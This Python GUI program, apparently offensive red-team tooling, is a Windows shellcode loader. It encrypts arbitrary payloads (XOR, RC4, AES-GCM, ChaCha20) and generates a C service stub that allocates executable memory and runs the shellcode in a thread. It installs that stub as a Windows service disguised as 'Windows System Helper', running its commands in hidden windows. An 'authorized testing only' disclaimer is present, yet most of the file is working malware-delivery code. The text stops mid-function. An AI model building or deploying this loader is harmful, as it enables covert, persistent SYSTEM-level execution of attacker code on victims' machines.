#!/usr/bin/env python3
"""
ABOLO Service Shellcode Loader — Python GUI Pro

FOR AUTHORIZED SECURITY TESTING ONLY.
Requires: Python 3.8+, Windows, Administrator privileges.

Install:
    pip install pycryptodome

Run:
    python abolo.py
"""

import os
import sys
import json
import ctypes
import subprocess
import threading
import time
import tempfile
import base64
import hashlib
import secrets
from datetime import datetime
from tkinter import (
    Tk, Toplevel, Frame, Label, Button, Entry, Text, StringVar, IntVar,
    BooleanVar, filedialog, messagebox, ttk, Menu, END, DISABLED, NORMAL,
    LEFT, RIGHT, TOP, BOTTOM, BOTH, X, Y, W, E, N, S, NW, NE, SW, SE,
    HORIZONTAL, VERTICAL, PanedWindow, Canvas
)

# Optional crypto
try:
    from Crypto.Cipher import AES, ARC4, ChaCha20
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


# ═══════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════

APP_TITLE = "Service Shellcode Loader — Pro"
APP_VERSION = "2.0.0"
APP_WIDTH = 1100
APP_HEIGHT = 720

DEFAULT_SERVICE_NAME = "AAAServiceTest1"
DEFAULT_DISPLAY_NAME = "Windows System Helper"
DEFAULT_DESCRIPTION = "Provides system maintenance operations."

# Theme colors (dark)
COLORS_DARK = {
    "bg":           "#1e1e1e",
    "bg_alt":       "#252526",
    "bg_panel":     "#2d2d30",
    "bg_input":     "#3c3c3c",
    "fg":           "#d4d4d4",
    "fg_dim":       "#808080",
    "accent":       "#007acc",
    "accent_hover": "#1177bb",
    "success":      "#4ec9b0",
    "warning":      "#dcdcaa",
    "error":        "#f48771",
    "border":       "#3c3c3c",
    "button":       "#0e639c",
    "button_hover": "#1177bb",
}

COLORS_LIGHT = {
    "bg":           "#f3f3f3",
    "bg_alt":       "#ffffff",
    "bg_panel":     "#e8e8e8",
    "bg_input":     "#ffffff",
    "fg":           "#1e1e1e",
    "fg_dim":       "#6a6a6a",
    "accent":       "#0078d4",
    "accent_hover": "#106ebe",
    "success":      "#107c10",
    "warning":      "#b7791f",
    "error":        "#a80000",
    "border":       "#d0d0d0",
    "button":       "#0078d4",
    "button_hover": "#106ebe",
}


# ═══════════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════════

def is_admin() -> bool:
    """Check if running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def elevate():
    """Re-launch the script with admin privileges."""
    try:
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{a}"' for a in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f'"{script}" {params}', None, 1)
        return True
    except Exception as e:
        messagebox.showerror("Elevation Failed", str(e))
        return False


def run_hidden(cmd, timeout=30):
    """Run a command hidden, return (stdout, stderr, rc)."""
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout,
                           startupinfo=si, encoding="utf-8",
                           errors="replace")
        return p.stdout, p.stderr, p.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def format_bytes(n: int) -> str:
    if n < 1024:
        return f"{n} B"
    if n < 1024 * 1024:
        return f"{n/1024:.2f} KB"
    return f"{n/(1024*1024):.2f} MB"


# ═══════════════════════════════════════════════════════════════════
# CRYPTO ENGINE
# ═══════════════════════════════════════════════════════════════════

class CryptoEngine:
    """Handles payload encryption."""

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    @staticmethod
    def rc4_encrypt(data: bytes, key: bytes) -> bytes:
        if HAS_CRYPTO:
            return ARC4.new(key[:16]).encrypt(data)
        return CryptoEngine.xor_encrypt(data, key)

    @staticmethod
    def aes_gcm_encrypt(data: bytes, key: bytes) -> bytes:
        if not HAS_CRYPTO:
            raise RuntimeError("pycryptodome required for AES-GCM")
        key = hashlib.sha256(key).digest()
        cipher = AES.new(key, AES.MODE_GCM)
        ct, tag = cipher.encrypt_and_digest(data)
        return cipher.nonce + ct + tag

    @staticmethod
    def chacha20_encrypt(data: bytes, key: bytes) -> bytes:
        if not HAS_CRYPTO:
            raise RuntimeError("pycryptodome required for ChaCha20")
        key = hashlib.sha256(key).digest()
        nonce = get_random_bytes(12)
        cipher = ChaCha20.new(key=key, nonce=nonce)
        return nonce + cipher.encrypt(data)

    @staticmethod
    def derive_key_static(passphrase: str) -> bytes:
        return hashlib.sha256(passphrase.encode()).digest()

    @staticmethod
    def derive_key_random() -> bytes:
        return secrets.token_bytes(32)


# ═══════════════════════════════════════════════════════════════════
# SERVICE MANAGER
# ═══════════════════════════════════════════════════════════════════

class ServiceManager:
    """Manages Windows service lifecycle via sc.exe."""

    def __init__(self, log_callback=None):
        self.log = log_callback or (lambda msg, level="info": None)

    def install(self, name, display, desc, bin_path):
        cmd = (
            f'sc create "{name}" '
            f'binPath= "\\"{bin_path}\\"" '
            f'DisplayName= "{display}" '
            f'start= demand '
            f'type= own'
        )
        out, err, rc = run_hidden(cmd)
        if rc == 0:
            # Set description
            run_hidden(f'sc description "{name}" "{desc}"')
            self.log(f"Service '{name}' installed.", "success")
            return True
        self.log(f"Install failed: {err or out}", "error")
        return False

    def uninstall(self, name):
        cmd = f'sc delete "{name}"'
        out, err, rc = run_hidden(cmd)
        if rc == 0:
            self.log(f"Service '{name}' uninstalled.", "success")
            return True
        self.log(f"Uninstall failed: {err or out}", "error")
        return False

    def start(self, name):
        out, err, rc = run_hidden(f'sc start "{name}"')
        if rc == 0:
            self.log(f"Service '{name}' started.", "success")
            return True
        self.log(f"Start failed: {err or out}", "error")
        return False

    def stop(self, name):
        out, err, rc = run_hidden(f'sc stop "{name}"')
        if rc == 0:
            self.log(f"Service '{name}' stopped.", "success")
            return True
        self.log(f"Stop failed: {err or out}", "error")
        return False

    def status(self, name):
        out, err, rc = run_hidden(f'sc query "{name}"')
        if rc != 0:
            return "NOT_INSTALLED"
        if "RUNNING" in out:
            return "RUNNING"
        if "STOPPED" in out:
            return "STOPPED"
        return "UNKNOWN"


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD BUILDERS
# ═══════════════════════════════════════════════════════════════════

class PayloadBuilder:
    """Builds C/C++ source stubs from shellcode."""

    @staticmethod
    def bytes_to_c_array(data: bytes, indent: str = "    ") -> str:
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            line = indent + "".join(f"0x{b:02X}, " for b in chunk)
            lines.append(line.rstrip())
        return "\n".join(lines)

    @staticmethod
    def build_c_stub(shellcode: bytes, service_name: str) -> str:
        arr = PayloadBuilder.bytes_to_c_array(shellcode)
        return f'''// Auto-generated service shellcode stub
// Service: {service_name}
// Generated: {datetime.now().isoformat()}
// FOR AUTHORIZED SECURITY TESTING ONLY
//
// Compile (MSVC):
//   cl /O2 /EHsc stub.c /link advapi32.lib
// Compile (MinGW):
//   x86_64-w64-mingw32-gcc -O2 -static -o stub.exe stub.c

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static unsigned char payload[] = {{
{arr}
}};

static SERVICE_STATUS        g_Status;
static SERVICE_STATUS_HANDLE g_hStatus;

static void ControlHandler(DWORD request) {{
    switch (request) {{
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            g_Status.dwWin32ExitCode = 0;
            g_Status.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus(g_hStatus, &g_Status);
            return;
    }}
    SetServiceStatus(g_hStatus, &g_Status);
}}

static void ServiceMain(int argc, char** argv) {{
    g_hStatus = RegisterServiceCtrlHandler("{service_name}", 
        (LPHANDLER_FUNCTION)ControlHandler);
    if (!g_hStatus) return;

    g_Status.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_Status.dwCurrentState            = SERVICE_START_PENDING;
    g_Status.dwControlsAccepted        = SERVICE_ACCEPT_STOP |
                                         SERVICE_ACCEPT_SHUTDOWN;
    g_Status.dwWin32ExitCode           = 0;
    g_Status.dwServiceSpecificExitCode = 0;
    g_Status.dwCheckPoint              = 0;
    g_Status.dwWaitHint                = 0;
    SetServiceStatus(g_hStatus, &g_Status);

    PVOID mem = VirtualAlloc(NULL, sizeof(payload),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem) {{
        memcpy(mem, payload, sizeof(payload));
        DWORD old = 0;
        VirtualProtect(mem, sizeof(payload),
            PAGE_EXECUTE_READWRITE, &old);
        HANDLE hThread = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

        g_Status.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(g_hStatus, &g_Status);

        if (hThread) {{
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }}
    }}

    g_Status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_hStatus, &g_Status);
}}

int main(void) {{
    SERVICE_TABLE_ENTRY table[2];
    table[0].lpServiceName = (LPSTR)"{service_name}";
    table[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    table[1].lpServiceName = NULL;
    table[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(table);
    return 0;
}}
'''


# ═══════════════════════════════════════════════════════════════════
# MAIN GUI
# ═══════════════════════════════════════════════════════════════════

class ServiceLoaderGUI:
    def __init__(self, root: Tk):
        self.root = root
        self.colors = COLORS_DARK.copy()  # default dark
        self.dark_mode = True

        # State
        self.shellcode = b""
        self.shellcode_path = ""
        self.encrypted = False
        self.encryption_key = b""
        self.encryption_alg = "none"
        self.project_file = None

        # Services
        self.svc_mgr = ServiceManager(self.log)

        # Build
        self._setup_window()
        self._build_menu()
        self._build_ui()
        self._apply_theme()

        # Initial status
        self.log(f"Service Shellcode Loader Pro v{APP_VERSION}", "info")
        self.log(f"Running as admin: {is_admin()}", 
                 "success" if is_admin() else "warning")
        if not is_admin():
            self.log("Administrator privileges required for service operations",
                     "warning")

        # Auto-check service status
        self._refresh_status()

    # ─────────────── WINDOW SETUP ───────────────

    def _setup_window(self):
        self.root.title(APP_TITLE)
        self.root.geometry(f"{APP_WIDTH}x{APP_HEIGHT}")
        self.root.minsize(900, 600)

        # Center window
        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - w) // 2
        y = (sh - h) // 2
        self.root.geometry(f"{w}x{h}+{x}+{y}")

        # Style
        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except Exception:
            pass

    def _build_menu(self):
        menubar = Menu(self.root)

        # File
        file_menu = Menu(menubar, tearoff=0)
        file_menu.add_command(label="Open Shellcode...",
                              command=self._browse_shellcode,
                              accelerator="Ctrl+O")
        file_menu.add_command(label="Open Project...",
                              command=self._open_project)
        file_menu.add_command(label="Save Project...",
                              command=self._save_project)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit,
                              accelerator="Ctrl+Q")
        menubar.add_cascade(label="File", menu=file_menu)

        # Service
        svc_menu = Menu(menubar, tearoff=0)
        svc_menu.add_command(label="Install", command=self._install_service)
        svc_menu.add_command(label="Start",   command=self._start_service)
        svc_menu.add_command(label="Stop",    command=self._stop_service)
        svc_menu.add_command(label="Uninstall", command=self._uninstall_service)
        svc_menu.add_separator()
        svc_menu.add_command(label="Refresh Status",
                             command=self._refresh_status)
        menubar.add_cascade(label="Service", menu=svc_menu)

        # View
        view_menu = Menu(menubar, tearoff=0)
        view_menu.add_command(label="Toggle Dark Mode",
                              command=self._toggle_theme)
        menubar.add_cascade(label="View", menu=view_menu)

        # Help
        help_menu = Menu(menubar, tearoff=0)
        help_menu.add_command(label="About", command=self._show_about)
        menubar.add_cascade(label="Help", menu=help_menu)

        self.root.config(menu=menubar)

        # Keyboard shortcuts
        self.root.bind("<Control-o>", lambda e: self._browse_shellcode())
        self.root.bind("<Control-q>", lambda e: self.root.quit())

    def _apply_theme(self):
        c = self.colors
        self.root.configure(bg=c["bg"])

        self.style.configure("TFrame", background=c["bg"])
        self.style.configure("TLabel",
                             background=c["bg"],
                             foreground=c["fg"],
                             font=("Segoe UI", 10))
        self.style.configure("TButton",
                             background=c["button"],
                             foreground="#ffffff",
                             borderwidth=0,
                             focusthickness=0,
                             font=("Segoe UI", 10),
                             padding=(12, 8))
        self.style.map("TButton",
                       background=[("active", c["button_hover"])])
        self.style.configure("TLabelframe",
                             background=c["bg"],
                             foreground=c["fg"],
                             borderwidth=1,
                             relief="solid")
        self.style.configure("TLabelframe.Label",
                             background=c["bg"],
                             foreground=c["accent"],
                             font=("Segoe UI", 10, "bold"))
        self.style.configure("TEntry",
                             fieldbackground=c["bg_input"],
                             foreground=c["fg"],
                             insertcolor=c["fg"],
                             borderwidth=1,
                             relief="solid")
        self.style.configure("TCombobox",
                             fieldbackground=c["bg_input"],
                             background=c["bg_panel"],
                             foreground=c["fg"],
                             borderwidth=1)
        self.style.map("TCombobox",
                       fieldbackground=[("readonly", c["bg_input"])])
        self.style.configure("TCheckbutton",
                             background=c["bg"],
                             foreground=c["fg"],
                             font=("Segoe UI", 10))
        self.style.configure("TNotebook",
                             background=c["bg"],
                             borderwidth=0)
        self.style.configure("TNotebook.Tab",
                             background=c["bg_panel"],
                             foreground=c["fg_dim"],
                             padding=(16, 8),
                             font=("Segoe UI", 10))
        self.style.map("TNotebook.Tab",
                       background=[("selected", c["bg"])],
                       foreground=[("selected", c["accent"])])
        self.style.configure("TProgressbar",
                             background=c["accent"],
                             troughcolor=c["bg_panel"],
                             borderwidth=0)

    def _toggle_theme(self):
        self.dark_mode = not self.dark_mode
        self.colors = COLORS_DARK.copy() if self.dark_mode else COLORS_LIGHT.copy()
        self._apply_theme()
        self._rebuild_ui_colors()

    # ─────────────── UI CONSTRUCTION ───────────────

    def _build_ui(self):
        c = self.colors

        # Top toolbar
        self._build_toolbar()

        # Main content
        main = Frame(self.root, bg=c["bg"])
        main.pack(fill=BOTH, expand=True, padx=10, pady=(0, 10))

        # Notebook (tabs)
        self.notebook = ttk.Notebook(main)
        self.notebook.pack(fill=BOTH, expand=True)

        # Tabs
        self._build_shellcode_tab()
        self._build_service_tab()
        self._build_build_tab()
        self._build_log_tab()
        self._build_about_tab()

        # Status bar
        self._build_statusbar()

    def _build_toolbar(self):
        c = self.colors
        tb = Frame(self.root, bg=c["bg_panel"], height=52)
        tb.pack(fill=X, side=TOP)
        tb.pack_propagate(False)

        def btn(text, cmd, width=14):
            b = Button(tb, text=text, command=cmd,
                       bg=c["button"], fg="#ffffff",
                       activebackground=c["button_hover"],
                       activeforeground="#ffffff",
                       relief="flat", bd=0,
                       font=("Segoe UI", 9),
                       padx=12, pady=6, cursor="hand2")
            b.pack(side=LEFT, padx=4, pady=8)
            return b

        btn("📂 Open", self._browse_shellcode)
        btn("💾 Save Project", self._save_project)
        btn("📤 Export Stub", self._export_stub)
        Frame(tb, bg=c["bg_panel"], width=20).pack(side=LEFT)
        btn("🔧 Install", self._install_service)
        btn("▶ Start", self._start_service)
        btn("⏹ Stop", self._stop_service)
        btn("🗑 Uninstall", self._uninstall_service)

    def _build_shellcode_tab(self):
        c = self.colors
        tab = Frame(self.notebook, bg=c["bg"])
        self.notebook.add(tab, text="  Shellcode  ")

        # Path section
        path_frame = Frame(tab, bg=c["bg"])
        path_frame.pack(fill=X, padx=12, pady=(12, 6))

        Label(path_frame, text="Shellcode Path:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).pack(side=LEFT)

        self.path_var = StringVar()
        entry = Entry(path_frame, textvariable=self.path_var,
                      bg=c["bg_input"], fg=c["fg"],
                      insertbackground=c["fg"],
                      relief="flat", font=("Consolas", 10))
        entry.pack(side=LEFT, fill=X, expand=True, padx=8, ipady=6)

        Button(path_frame, text="Browse...",
               command=self._browse_shellcode,
               bg=c["button"], fg="#ffffff",
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=14, pady=6, cursor="hand2").pack(side=LEFT)

        # Info row
        info_frame = Frame(tab, bg=c["bg"])
        info_frame.pack(fill=X, padx=12, pady=6)

        self.size_label = Label(info_frame, text="Size: —",
                                bg=c["bg"], fg=c["fg_dim"],
                                font=("Segoe UI", 9))
        self.size_label.pack(side=LEFT, padx=(0, 20))

        self.hash_label = Label(info_frame, text="SHA-256: —",
                                bg=c["bg"], fg=c["fg_dim"],
                                font=("Consolas", 9))
        self.hash_label.pack(side=LEFT)

        # Preview
        Label(tab, text="Hex Preview:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10, "bold")).pack(anchor=W, padx=12, pady=(12, 4))

        self.preview_text = Text(tab,
                                 bg=c["bg_input"], fg=c["fg"],
                                 insertbackground=c["fg"],
                                 font=("Consolas", 10),
                                 relief="flat", wrap="none")
        self.preview_text.pack(fill=BOTH, expand=True, padx=12, pady=(0, 12))

        # Scrollbar
        sb = ttk.Scrollbar(self.preview_text, command=self.preview_text.yview)
        sb.pack(side=RIGHT, fill=Y)
        self.preview_text.config(yscrollcommand=sb.set)

        self._set_preview("No shellcode loaded. Click 'Browse' to select a .bin file.")

    def _build_service_tab(self):
        c = self.colors
        tab = Frame(self.notebook, bg=c["bg"])
        self.notebook.add(tab, text="  Service Config  ")

        # Service fields
        grid = Frame(tab, bg=c["bg"])
        grid.pack(fill=X, padx=12, pady=12)

        def field(row, label, default="", show=None):
            Label(grid, text=label,
                  bg=c["bg"], fg=c["fg"],
                  font=("Segoe UI", 10)).grid(
                row=row, column=0, sticky=W, pady=6, padx=(0, 10))
            var = StringVar(value=default)
            entry = Entry(grid, textvariable=var,
                          bg=c["bg_input"], fg=c["fg"],
                          insertbackground=c["fg"],
                          relief="flat", font=("Consolas", 10),
                          show=show)
            entry.grid(row=row, column=1, sticky=EW, pady=6, ipady=6)
            grid.columnconfigure(1, weight=1)
            return var

        self.svc_name_var = field(0, "Service Name:", DEFAULT_SERVICE_NAME)
        self.svc_display_var = field(1, "Display Name:", DEFAULT_DISPLAY_NAME)
        self.svc_desc_var = field(2, "Description:", DEFAULT_DESCRIPTION)
        self.svc_bin_var = field(3, "Binary Path:", "")

        # Auto-populate bin path
        Button(grid, text="Auto (this script)",
               command=self._auto_bin_path,
               bg=c["button"], fg="#ffffff",
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=12, pady=4, cursor="hand2").grid(
            row=4, column=1, sticky=W, pady=6)

        # Encryption
        enc_frame = ttk.LabelFrame(tab, text="Payload Encryption")
        enc_frame.pack(fill=X, padx=12, pady=(12, 6))

        enc_grid = Frame(enc_frame, bg=c["bg"])
        enc_grid.pack(fill=X, padx=12, pady=10)

        Label(enc_grid, text="Algorithm:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).grid(row=0, column=0, sticky=W, pady=4)

        self.enc_var = StringVar(value="none")
        enc_combo = ttk.Combobox(enc_grid, textvariable=self.enc_var,
                                 values=["none", "xor", "rc4", "aes-gcm", "chacha20"],
                                 state="readonly", width=20)
        enc_combo.grid(row=0, column=1, sticky=W, pady=4, padx=10)

        Label(enc_grid, text="Key (passphrase):",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).grid(row=1, column=0, sticky=W, pady=4)

        self.key_var = StringVar(value="")
        Entry(enc_grid, textvariable=self.key_var,
              bg=c["bg_input"], fg=c["fg"],
              insertbackground=c["fg"],
              relief="flat", font=("Consolas", 10),
              show="•").grid(row=1, column=1, sticky=EW, pady=4, padx=10, ipady=6)
        enc_grid.columnconfigure(1, weight=1)

        Button(enc_grid, text="Random Key",
               command=self._random_key,
               bg=c["bg_panel"], fg=c["fg"],
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=12, pady=4, cursor="hand2").grid(row=1, column=2, pady=4)

    def _build_build_tab(self):
        c = self.colors
        tab = Frame(self.notebook, bg=c["bg"])
        self.notebook.add(tab, text="  Build  ")

        # Build options
        opt_frame = ttk.LabelFrame(tab, text="Build Options")
        opt_frame.pack(fill=X, padx=12, pady=12)

        opt_inner = Frame(opt_frame, bg=c["bg"])
        opt_inner.pack(fill=X, padx=12, pady=10)

        Label(opt_inner, text="Stub Language:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).grid(row=0, column=0, sticky=W, pady=6)

        self.lang_var = StringVar(value="c")
        lang_combo = ttk.Combobox(opt_inner, textvariable=self.lang_var,
                                  values=["c", "python", "powershell"],
                                  state="readonly", width=20)
        lang_combo.grid(row=0, column=1, sticky=W, pady=6, padx=10)

        Label(opt_inner, text="Output File:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).grid(row=1, column=0, sticky=W, pady=6)

        self.output_var = StringVar(value="")
        Entry(opt_inner, textvariable=self.output_var,
              bg=c["bg_input"], fg=c["fg"],
              insertbackground=c["fg"],
              relief="flat", font=("Consolas", 10)).grid(
            row=1, column=1, sticky=EW, pady=6, padx=10, ipady=6)
        opt_inner.columnconfigure(1, weight=1)

        Button(opt_inner, text="Choose...",
               command=self._choose_output,
               bg=c["button"], fg="#ffffff",
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=12, pady=4, cursor="hand2").grid(row=1, column=2, pady=6)

        # Actions
        action_frame = Frame(tab, bg=c["bg"])
        action_frame.pack(fill=X, padx=12, pady=12)

        Button(action_frame, text="⚙ Build Stub",
               command=self._build_stub,
               bg=c["accent"], fg="#ffffff",
               activebackground=c["accent_hover"],
               relief="flat", font=("Segoe UI", 11, "bold"),
               padx=24, pady=10, cursor="hand2").pack(side=LEFT, padx=(0, 8))

        Button(action_frame, text="🔨 Build EXE (MinGW)",
               command=self._build_exe,
               bg=c["button"], fg="#ffffff",
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 10),
               padx=20, pady=10, cursor="hand2").pack(side=LEFT, padx=8)

        Button(action_frame, text="📋 Copy Stub",
               command=self._copy_stub,
               bg=c["bg_panel"], fg=c["fg"],
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 10),
               padx=20, pady=10, cursor="hand2").pack(side=LEFT, padx=8)

        # Preview
        Label(tab, text="Stub Preview:",
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10, "bold")).pack(anchor=W, padx=12, pady=(12, 4))

        self.stub_preview = Text(tab,
                                 bg=c["bg_input"], fg=c["fg"],
                                 insertbackground=c["fg"],
                                 font=("Consolas", 9),
                                 relief="flat", wrap="none")
        self.stub_preview.pack(fill=BOTH, expand=True, padx=12, pady=(0, 12))

    def _build_log_tab(self):
        c = self.colors
        tab = Frame(self.notebook, bg=c["bg"])
        self.notebook.add(tab, text="  Logs  ")

        # Log controls
        ctrl = Frame(tab, bg=c["bg"])
        ctrl.pack(fill=X, padx=12, pady=(12, 6))

        Button(ctrl, text="🗑 Clear",
               command=lambda: self._clear_log(),
               bg=c["bg_panel"], fg=c["fg"],
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=12, pady=4, cursor="hand2").pack(side=LEFT)

        Button(ctrl, text="💾 Save Log",
               command=self._save_log,
               bg=c["bg_panel"], fg=c["fg"],
               activebackground=c["button_hover"],
               relief="flat", font=("Segoe UI", 9),
               padx=12, pady=4, cursor="hand2").pack(side=LEFT, padx=8)

        # Log text
        self.log_text = Text(tab,
                             bg="#0d0d0d", fg="#d4d4d4",
                             insertbackground="#d4d4d4",
                             font=("Consolas", 10),
                             relief="flat", wrap="word")
        self.log_text.pack(fill=BOTH, expand=True, padx=12, pady=(0, 12))

        # Tags
        self.log_text.tag_config("info",    foreground="#d4d4d4")
        self.log_text.tag_config("success", foreground="#4ec9b0")
        self.log_text.tag_config("warning", foreground="#dcdcaa")
        self.log_text.tag_config("error",   foreground="#f48771")
        self.log_text.tag_config("time",    foreground="#808080")

    def _build_about_tab(self):
        c = self.colors
        tab = Frame(self.notebook, bg=c["bg"])
        self.notebook.add(tab, text="  About  ")

        inner = Frame(tab, bg=c["bg"])
        inner.pack(fill=BOTH, expand=True, padx=40, pady=40)

        Label(inner, text="Service Shellcode Loader",
              bg=c["bg"], fg=c["accent"],
              font=("Segoe UI", 20, "bold")).pack(anchor=W)

        Label(inner, text=f"Pro Edition v{APP_VERSION}",
              bg=c["bg"], fg=c["fg_dim"],
              font=("Segoe UI", 11)).pack(anchor=W, pady=(4, 20))

        about_text = (
            "FOR AUTHORIZED SECURITY TESTING ONLY.\n\n"
            "This tool creates and manages Windows services that execute "
            "shellcode with SYSTEM privileges. It is intended for:\n\n"
            "  • Authorized red team engagements\n"
            "  • Internal security testing with written approval\n"
            "  • Isolated lab environments\n"
            "  • Academic security research\n\n"
            "UNAUTHORIZED USE IS A CRIME under CFAA, Computer Misuse Act, "
            "GDPR, and equivalent laws worldwide.\n\n"
            "Features:\n"
            "  • Multi-format shellcode loading (raw, hex, base64)\n"
            "  • Payload encryption (XOR, RC4, AES-GCM, ChaCha20)\n"
            "  • C/Python/PowerShell stub generation\n"
            "  • Full service lifecycle management\n"
            "  • Real-time logging\n\n"
            "Requirements:\n"
            "  • Windows 10/11 or Server 2016+\n"
            "  • Python 3.8+\n"
            "  • Administrator privileges\n"
            "  • pycryptodome (optional, for AES/ChaCha20)\n"
        )

        Label(inner, text=about_text, justify=LEFT,
              bg=c["bg"], fg=c["fg"],
              font=("Segoe UI", 10)).pack(anchor=W)

    def _build_statusbar(self):
        c = self.colors
        sb = Frame(self.root, bg=c["bg_panel"], height=26)
        sb.pack(fill=X, side=BOTTOM)
        sb.pack_propagate(False)

        self.status_var = StringVar(value="Ready")
        self.status_label = Label(sb, textvariable=self.status_var,
                                  bg=c["bg_panel"], fg=c["fg_dim"],
                                  font=("Segoe UI", 9),
                                  anchor=W)
        self.status_label.pack(side=LEFT, padx=10)

        self.admin_label = Label(sb,
                                 text="ADMIN" if is_admin() else "USER",
                                 bg=c["bg_panel"],
                                 fg=c["success"] if is_admin() else c["error"],
                                 font=("Segoe UI", 9, "bold"))
        self.admin_label.pack(side=RIGHT, padx=10)

    def _rebuild_ui_colors(self):
        """Re-apply background colors after theme switch."""
        c = self.colors
        self.root.configure(bg=c["bg"])

        def recolor(widget):
            try:
                cls = widget.winfo_class()
                if cls in ("Frame", "Label", "LabelFrame", "PanedWindow"):
                    widget.configure(bg=c["bg"])
                elif cls == "Button":
                    widget.configure(bg=c["button"],
                                     fg="#ffffff",
                                     activebackground=c["button_hover"])
                elif cls == "Text":
                    widget.configure(bg=c["bg_input"], fg=c["fg"],
                                     insertbackground=c["fg"])
                elif cls == "Entry":
                    widget.configure(bg=c["bg_input"], fg=c["fg"],
                                     insertbackground=c["fg"])
            except Exception:
                pass
            for child in widget.winfo_children():
                recolor(child)

        recolor(self.root)

    # ─────────────── LOGGING ───────────────

    def log(self, msg, level="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        if hasattr(self, "log_text"):
            self.log_text.insert(END, f"[{ts}] ", "time")
            self.log_text.insert(END, f"{msg}\n", level)
            self.log_text.see(END)

        if hasattr(self, "status_var"):
            self.status_var.set(msg)

    def _clear_log(self):
        if hasattr(self, "log_text"):
            self.log_text.delete("1.0", END)
            self.log("Log cleared", "info")

    def _save_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.log_text.get("1.0", END))
            self.log(f"Log saved: {path}", "success")

    # ─────────────── SHELLCODE HANDLING ───────────────

    def _browse_shellcode(self):
        path = filedialog.askopenfilename(
            title="Select Shellcode File",
            filetypes=[
                ("Binary Files", "*.bin"),
                ("Raw Files", "*.raw"),
                ("Hex Files", "*.hex"),
                ("Base64 Files", "*.b64"),
                ("All Files", "*.*"),
            ])
        if path:
            self._load_shellcode(path)

    def _load_shellcode(self, path):
        try:
            with open(path, "rb") as f:
                raw = f.read()
        except Exception as e:
            self.log(f"Failed to read file: {e}", "error")
            messagebox.showerror("Read Error", str(e))
            return

        # Auto-detect format
        ext = os.path.splitext(path)[1].lower()
        try:
            if ext == ".hex":
                data = bytes.fromhex(raw.decode().strip().replace("\n", "").replace(" ", ""))
            elif ext == ".b64":
                data = base64.b64decode(raw)
            else:
                data = raw
        except Exception as e:
            self.log(f"Format parse failed, using raw: {e}", "warning")
            data = raw

        self.shellcode = data
        self.shellcode_path = path
        self.path_var.set(path)

        # Update labels
        self.size_label.config(text=f"Size: {format_bytes(len(data))} ({len(data)} bytes)")
        h = hashlib.sha256(data).hexdigest()
        self.hash_label.config(text=f"SHA-256: {h[:32]}...")

        # Preview
        self._render_hex_preview(data)

        self.log(f"Loaded {format_bytes(len(data))} from {os.path.basename(path)}",
                 "success")

    def _render_hex_preview(self, data: bytes):
        lines = []
        show = data[:2048]
        for i in range(0, len(show), 16):
            chunk = show[i:i+16]
            hex_part = " ".join(f"{b:02X}" for b in chunk)
            ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            lines.append(f"{i:08X}  {hex_part:<47}  {ascii_part}")
        if len(data) > len(show):
            lines.append(f"\n... ({len(data) - len(show)} more bytes not shown)")
        self._set_preview("\n".join(lines))

    def _set_preview(self, text):
        self.preview_text.config(state=NORMAL)
        self.preview_text.delete("1.0", END)
        self.preview_text.insert("1.0", text)
        self.preview_text.config(state=DISABLED)

    # ─────────────── SERVICE OPERATIONS ───────────────

    def _auto_bin_path(self):
